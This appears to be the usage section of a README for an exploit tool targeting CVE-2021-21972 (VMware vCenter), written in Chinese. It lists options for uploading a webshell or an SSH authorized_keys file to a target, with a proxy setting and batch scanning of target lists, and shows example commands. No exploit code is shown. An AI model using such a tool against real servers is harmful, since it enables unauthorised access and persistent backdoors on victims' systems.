# Usage:CVE-2021-21972.py [option]
- -u or --url：目标url
- -t or --type：Payload类型（ssh/webshell)
- -f or --file：要上传的文件（webshell或authorized_keys）	例如：CVE-2021-21972.py -u https://127.0.0.1 -t webshell -f shell.jsp
- -p or --proxy：设置代理	例如：CVE-2021-21972.py -u https://127.0.0.1 -t webshell -f shell.jsp -p https://127.0.0.1:8080
- -l or --list：批量检测	例如：CVE-2021-21972.py -l list.txt -t webshell -f shell.jsp
